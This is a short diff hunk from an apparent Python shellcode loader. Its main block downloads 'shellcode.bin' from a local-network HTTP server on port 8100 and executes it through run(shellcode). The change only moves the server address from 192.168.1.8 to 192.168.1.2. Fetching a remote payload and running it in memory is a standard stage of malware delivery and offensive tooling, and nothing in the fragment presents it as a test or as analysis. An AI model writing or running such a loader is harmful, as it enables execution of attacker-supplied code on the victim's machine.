@@ -39,6 +39,6 @@ def run(shellcode):
 
 
 if __name__ == '__main__':
-    url = 'http://192.168.1.8:8100/shellcode.bin'
+    url = 'http://192.168.1.2:8100/shellcode.bin'
     shellcode = get_code(url)
     run(shellcode)
